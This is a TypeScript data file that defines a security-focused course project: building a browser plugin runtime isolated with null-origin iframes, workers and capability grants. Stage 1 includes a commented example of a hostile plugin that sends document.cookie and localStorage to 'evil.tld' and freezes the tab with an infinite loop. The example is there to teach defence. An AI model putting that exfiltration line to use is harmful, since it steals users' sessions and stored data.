import type { ProjectBlueprint } from '../types';

/** The dare — run untrusted third-party code in your page and survive it. */
export const sandboxRuntimeProject: ProjectBlueprint = {
  id: 'adv-sandbox-runtime',
  title: 'A Plugin Runtime That Executes Code You Do Not Trust',
  tagline: 'Third-party plugins, in your page, with your user session — and no path to their data.',
  realWorldAnalog: 'Figma plugins / Shopify checkout extensions',
  track: 'product',
  tier: 'flagship',
  difficulty: 'Principal',
  estimatedBuildTimeHours: 20,
  architecturePattern: 'Capability-based sandbox: null-origin iframe + worker + RPC membrane',
  prerequisites: ['inter-designed-dashboard'],
  summary:
    'Build a runtime that lets untrusted plugin code render UI and call host APIs, where a hostile plugin cannot read the session, exfiltrate data, or freeze the page. The security model is the entire project: every capability a plugin holds must be one you deliberately handed it, and the interesting failures are the ones that look safe.',
  tags: ['Security', 'Sandboxing', 'Workers', 'CSP', 'Principal'],
  xpBounty: 520,
  coreScopeBoundaries: {
    inScopeMinimal: [
      'Plugin execution in a null-origin sandboxed iframe hosting a Worker.',
      'A structured RPC membrane — no host object ever crosses the boundary.',
      'A capability manifest: a plugin receives exactly the APIs it declared.',
      'A watchdog that terminates a plugin exceeding its time or memory budget.',
    ],
    outOfScopeBloat: [
      'A plugin marketplace, billing, or review pipeline.',
      'A custom JavaScript interpreter — the platform already isolates.',
      'Server-side plugin execution.',
    ],
  },
  stages: [
    {
      stageNumber: 1,
      stageName: 'eval and good intentions',
      focus: 'Running plugin code in the host realm',
      codeSnippet: `const fn = new Function('host', pluginSource);\nfn(hostApi);            // plugin now shares your realm\n\n// A three-line hostile plugin:\n// fetch('https://evil.tld', { method: 'POST',\n//   body: JSON.stringify({ c: document.cookie, s: localStorage }) });\n// while (true) {}   // and the tab is gone`,
      failureModeOrInvariant:
        'The plugin has the host origin, so it holds the session cookie, localStorage, the DOM and every fetch credential. An infinite loop freezes the main thread. Freezing prototypes does not help — the plugin can reach the same globals through any object it is handed.',
      architecturalLesson:
        'Isolation is a property of the realm and the origin, not of how carefully you pass objects. Same realm means no isolation at all.',
    },
    {
      stageNumber: 2,
      stageName: 'A boundary the platform enforces',
      focus: 'Null-origin iframe, worker realm, CSP, postMessage only',
      codeSnippet: `<iframe sandbox="allow-scripts"          <!-- no allow-same-origin: null origin -->\n        csp="default-src 'none'; script-src 'unsafe-inline'"\n        src="data:text/html,..."></iframe>\n\n// Inside: the plugin runs in a Worker, so it cannot touch even that DOM\nworker.postMessage({ type: 'render', props: structuredClone(safeProps) });\n// structuredClone throws on functions — accidental capability leaks fail loudly`,
      failureModeOrInvariant:
        'The plugin realm has a null origin, so it shares no storage, no cookies and no DOM with the host. A runaway loop blocks only its own worker thread. Crucially, `allow-scripts` together with `allow-same-origin` would silently undo all of this — the two flags together are equivalent to no sandbox.',
      architecturalLesson:
        'structuredClone as the only transport is a design choice, not a limitation: if a value cannot be cloned it cannot be a capability leak.',
    },
    {
      stageNumber: 3,
      stageName: 'Capabilities, not permissions',
      focus: 'A membrane that hands out revocable, narrow references',
      codeSnippet: `// The plugin never receives an object — only a token it can call back with\nconst grant = capabilities.issue(pluginId, 'storage:read', { keys: ['prefs'] });\n\nonMessage(({ cap, method, args }) => {\n  const grant = registry.resolve(cap);            // unknown token: reject\n  if (!grant || grant.revoked) return deny();\n  if (!grant.allows(method, args)) return deny(); // arguments checked, not just method\n  return grant.invoke(method, args);\n});`,
      failureModeOrInvariant:
        'A plugin granted storage:read for `prefs` cannot read `session` by passing a different key, because the grant validates arguments and not merely the method name. Revoking a grant takes effect on the next call with no plugin cooperation.',
      architecturalLesson:
        'A permission is a question asked at the boundary; a capability is an unforgeable reference. Capabilities compose and revoke cleanly, which is why every real plugin system converges on them.',
    },
    {
      stageNumber: 4,
      stageName: 'Budgets and blast radius',
      focus: 'Watchdogs, rendering untrusted trees, telemetry per plugin',
      codeSnippet: `// The host owns the DOM; plugins describe it and never touch it\nconst tree = PluginNodeSchema.parse(message.tree);   // reject unknown node types\n\n// Time budget enforced from the host, since the worker cannot police itself\nconst deadline = setTimeout(() => worker.terminate(), 32);\n// href/src are validated against an allowlist: javascript: is a script tag`,
      failureModeOrInvariant:
        'A plugin returning a node with an onClick string, a javascript: href, or an unknown type is rejected at the schema rather than rendered. A plugin missing its 32ms frame budget is terminated and shown as degraded, not allowed to drop frames for everyone.',
      architecturalLesson:
        'Untrusted UI is data describing a tree, never markup. The host decides what a described node is permitted to become.',
    },
  ],
  deliverables: [
    { id: 'Host', title: 'Host', spec: 'A host shell rendering plugin surfaces into bounded grid slots it owns, each with an identity badge, a revoke control at the trailing edge, rem-sized dimensions and an aspect-ratio reservation.' },
    { id: 'Architecture', title: 'Architecture', spec: 'A written boundary document stating which state belongs to the host, which to the plugin, and which to the server, with the enforcement point for each.' },
  ],
  layers: [
    {
      layer: 'Host',
      components: ['capability registry', 'RPC router', 'watchdog', 'plugin surface renderer'],
      invariants: ['No host object reference ever crosses the postMessage boundary.'],
    },
    {
      layer: 'Boundary',
      components: ['null-origin iframe', 'per-plugin Worker', 'structured-clone transport', 'CSP'],
      invariants: ['allow-scripts and allow-same-origin are never set together.'],
    },
    {
      layer: 'Plugin',
      components: ['plugin SDK shim', 'declared capability manifest'],
      invariants: ['A plugin holds only capabilities its manifest declared and the user approved.'],
    },
  ],
  explicitTopics: [
    {
      category: 'Web Platform',
      topic: 'Security',
      subtopic: 'XSS, CSRF, clickjacking and CSP',
      howCovered: 'The threat model is written first; CSP, sandbox flags and URL-scheme validation are each defeated then fixed.',
      conceptIds: ['web-security'],
    },
    {
      category: 'Web Platform',
      topic: 'Network',
      subtopic: 'Same-origin policy, origins and CORS',
      howCovered: 'The null-origin iframe makes the same-origin policy the enforcement mechanism rather than a footnote.',
      conceptIds: ['web-cors'],
    },
    {
      category: 'Web Platform',
      topic: 'Storage',
      subtopic: 'Origin-partitioned storage',
      howCovered: 'Demonstrates that a null-origin frame shares no cookies, localStorage or IndexedDB with the host.',
      conceptIds: ['web-storage'],
    },
    {
      category: 'JavaScript',
      topic: 'Data',
      subtopic: 'Structured clone vs references',
      howCovered: 'structuredClone is used as the only transport precisely because it cannot carry a function.',
      conceptIds: ['react-references-copying', 'js-arrays-objects'],
    },
    {
      category: 'TypeScript',
      topic: 'Types',
      subtopic: 'Runtime validation at a trust boundary',
      howCovered: 'Every inbound message is schema-parsed, since a type annotation is erased and proves nothing at runtime.',
      conceptIds: ['ts-essentials'],
    },
  ],
  implicitFoundations: [
    {
      domain: 'Security & Invariants',
      title: 'Realms and origins',
      mechanism: 'Each browsing context has its own realm and intrinsics; the origin tuple gates storage and DOM access.',
      realWorldImpact: 'Explains why object-freezing defences fail and platform isolation does not.',
      conceptIds: ['web-security', 'web-cors'],
    },
    {
      domain: 'V8 Engine & Memory',
      title: 'Thread isolation',
      mechanism: 'A Worker has its own event loop and heap; terminate() reclaims both immediately.',
      realWorldImpact: 'A hostile infinite loop costs one worker rather than the user’s tab.',
      conceptIds: ['js-event-loop'],
    },
  ],
  frameworkVsManual: {
    frameworkHandled: ['Browser-enforced origin isolation', 'structuredClone serialisation'],
    manualEngineeringRequired: [
      'The capability registry, the membrane and the revocation model.',
      'The threat model document, written before any code.',
      'Schema validation of every untrusted UI tree.',
    ],
  },
};
